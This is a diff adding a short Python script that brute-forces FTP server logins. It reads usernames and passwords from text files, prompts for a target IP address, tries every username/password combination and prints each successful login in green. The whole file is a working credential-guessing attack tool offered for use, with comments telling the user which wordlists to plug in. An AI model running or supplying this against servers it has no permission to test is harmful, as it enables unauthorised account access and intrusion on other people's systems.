@@ -1,0 +1,37 @@
+from ftplib import FTP
+from termcolor import colored #nadajemy kolory po przecinku w stringu
+
+users = open("users.txt").read().split("\n") #instead of users.txt add the file that contains your list of users
+passwd = open("pass.txt").read().split("\n") #same here for passwords
+
+print(users)
+print(passwd)
+target = input(colored("Enter FTP server IP address: ", "magenta"))
+
+
+def login(user, password, hostname):
+    try:
+        ftp = FTP(hostname)
+        ftp.login(user, password)
+        print(colored(f"\n[+] FTP login to {hostname} successful: {user}:{password}", "green"))
+        ftp.close()
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+
+
+def looper():
+    for user in users:
+        for password in passwd:
+            print(f"[!]Trying {user}:{password}")
+            login(user, password, target)
+
+
+def main():
+    looper()
+
+
+if __name__ == "__main__":
+    main()
